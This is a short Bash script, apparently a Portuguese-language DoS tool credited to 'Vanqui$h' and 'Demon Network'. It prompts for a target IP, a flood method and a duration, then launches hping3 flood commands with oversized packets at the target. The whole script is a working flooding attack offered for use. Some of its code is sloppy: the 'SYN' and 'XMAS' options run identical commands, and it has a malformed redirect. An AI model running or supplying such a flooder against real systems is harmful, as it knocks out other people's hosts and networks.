#!/bin/bash
clear

echo -e '\033[01;34m¦¦+¦¦+  ¦¦+         ¦¦¦¦¦+       ¦¦¦¦¦¦+\033'
echo -e '\033[01;34m¦¦¦¦¦¦  ¦¦¦        ¦¦+--¦¦+      ¦¦+--¦¦+\033'
echo -e '\033[01;34m¦¦¦¦¦¦¦¦¦¦¦        ¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦¦¦¦++\033'
echo -e '\033[01;34m¦¦¦+----¦¦¦        ¦¦+--¦¦¦+----+¦¦+--¦¦+\033'
echo -e '\033[01;34m¦¦¦¦¦¦¦+¦¦¦        ¦¦¦  ¦¦¦      ¦¦¦¦¦¦++\033'
echo -e '\033[01;34m+------++-+        +-+  +-+      +-----+\033'
echo -e '\033[05;36m                       Coded by Vanqui$h\033[00;37m'
echo ""
echo "Defina o Alvo[IP]:"
read ip
echo ""
echo -e '\033[01;33m[Metodos]\033'
echo ""
echo "TTCP-SYN = 1"
echo "XMAS = 2"
echo "UDP = 3"
echo -e '\033[01;37m\033'
echo "EEscolha um metodo:"
read metodo
echo ""
echo "Digite o Tempo de Ataque em segundos:"
read segundos
echo ""
clear
echo -e '\033[01;031m           [Ataque Iniciado!]\033'
echo ""
if [ "$metodo" = "1" ]
then
timeout -s9 $segundos sudo hping3 $ip -c 1000000 -d 65455 -X -w 64 --flood | 2> /dev/null
fi

if [ "$metodo" = "2" ]
then
timeout -s9 $segundos sudo hping3 $ip -c 1000000 -d 65455 -X -w 64 --flood | 2> /dev/null
fi

if [ "$metodo" = "3" ]
then
timeout -s9 $segundos sudo hping3 $ip -c 1000000 -d 65455 --udp -w 64 --flood | 2> /dev/null
fi
echo ""
echo -e '\033[01;37m           Ataque Finalizado | Demon \033[04;32mNetwork\033[00;37m!'
echo ""
